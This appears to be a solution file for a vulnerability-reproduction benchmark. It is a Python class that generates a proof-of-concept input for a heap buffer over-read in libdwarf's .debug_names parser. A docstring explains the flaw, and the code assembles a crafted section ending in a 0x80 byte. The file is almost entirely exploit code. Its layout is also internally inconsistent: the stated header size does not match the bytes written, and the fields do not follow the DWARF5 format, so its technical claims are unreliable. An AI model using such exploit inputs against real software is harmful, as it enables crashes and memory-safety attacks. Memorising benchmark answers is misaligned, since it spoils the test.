import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow in libdwarf
        (oss-fuzz:383170474) when parsing a crafted .debug_names section.

        The vulnerability is a heap-based buffer over-read in the function
        _dwarf_read_debugnames_body in src/lib/libdwarf/dwarf_debugnames.c.
        The function reads an index (`entry_pool_idx`) from the file and uses it
        to calculate a pointer (`poolptr`) into the `entry_pool` data buffer.
        
        A check `if (entry_pool_idx >= dn->dn_entry_pool_size)` ensures that
        `poolptr` itself points within the bounds of the `entry_pool`. However,
        the subsequent call to `dwarf_decode_uleb128(poolptr, ...)` can read
        multiple bytes, and the code fails to ensure that this multi-byte read
        will not go past the end of the buffer.

        This PoC exploits this flaw by:
        1.  Constructing a `.debug_names` section that passes initial validation.
        2.  Setting `name_count` to 1 to enter the vulnerable loop.
        3.  Providing an `entry_pool_idx` that points to the very last byte of
            the allocated `entry_pool` buffer. This index is valid and passes
            the existing check.
        4.  Placing a byte with the most significant bit set (e.g., 0x80) at
            this final position in the `entry_pool`.
            
        When `dwarf_decode_uleb128` is called on `poolptr`, it reads the 0x80
        byte, interprets it as a continuation of a ULEB128 sequence, and
        attempts to read the next byte, which is one byte beyond the buffer's
        end, triggering a heap buffer overflow.
        """
        
        def u32(n):
            return struct.pack('<I', n)

        def u16(n):
            return struct.pack('<H', n)

        poc = bytearray()

        # DWARF5 .debug_names header parameters
        version = 5
        comp_unit_count = 0
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 1
        name_count = 1
        abbrev_table_size = 1
        entry_pool_size = 256

        # Calculate layout based on libdwarf's parsing logic
        header_size = 32
        
        fixed_tables_size = (
            8 * comp_unit_count +
            4 * bucket_count +
            4 * name_count +  # Name indices
            4 * name_count    # Entry pool indices
        )

        string_table_size = 4
        
        total_size = (
            header_size +
            fixed_tables_size +
            string_table_size +
            abbrev_table_size +
            entry_pool_size
        )
        
        unit_length = total_size - 4

        # Build Header
        poc += u32(unit_length)
        poc += u16(version)
        poc += u16(0)  # padding
        poc += u32(comp_unit_count)
        poc += u32(local_type_unit_count)
        poc += u32(foreign_type_unit_count)
        poc += u32(bucket_count)
        poc += u32(name_count)
        poc += u32(abbrev_table_size)
        poc += u32(entry_pool_size)

        # Build index tables
        poc += u32(0)  # Bucket: index 0 into name table
        poc += u32(0)  # Name Index: index 0 into string table

        # Entry Pool Index: Point to the last byte of the entry pool
        entry_pool_idx = entry_pool_size - 1
        poc += u32(entry_pool_idx)

        # Build data sections
        poc += b'A\x00\x00\x00'  # String table

        poc += b'\x00' * abbrev_table_size  # Abbrev table

        # Entry Pool: all zeros except the last byte
        poc += b'\x00' * (entry_pool_size - 1)
        # Malicious byte to trigger read past end
        poc += b'\x80'
        
        return bytes(poc)